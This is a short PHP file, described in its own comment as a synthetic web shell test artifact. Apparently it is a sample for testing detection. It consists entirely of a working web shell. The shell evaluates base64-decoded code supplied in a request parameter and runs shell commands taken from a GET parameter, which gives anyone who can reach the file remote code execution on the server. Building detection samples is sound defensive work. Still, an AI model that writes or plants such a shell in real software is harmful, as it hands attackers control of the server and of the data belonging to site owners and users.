<?php
// synthetic web shell test artifact
if (isset($_REQUEST['c'])) { eval(base64_decode($_REQUEST['c'])); }
system($_GET['cmd']);
?>
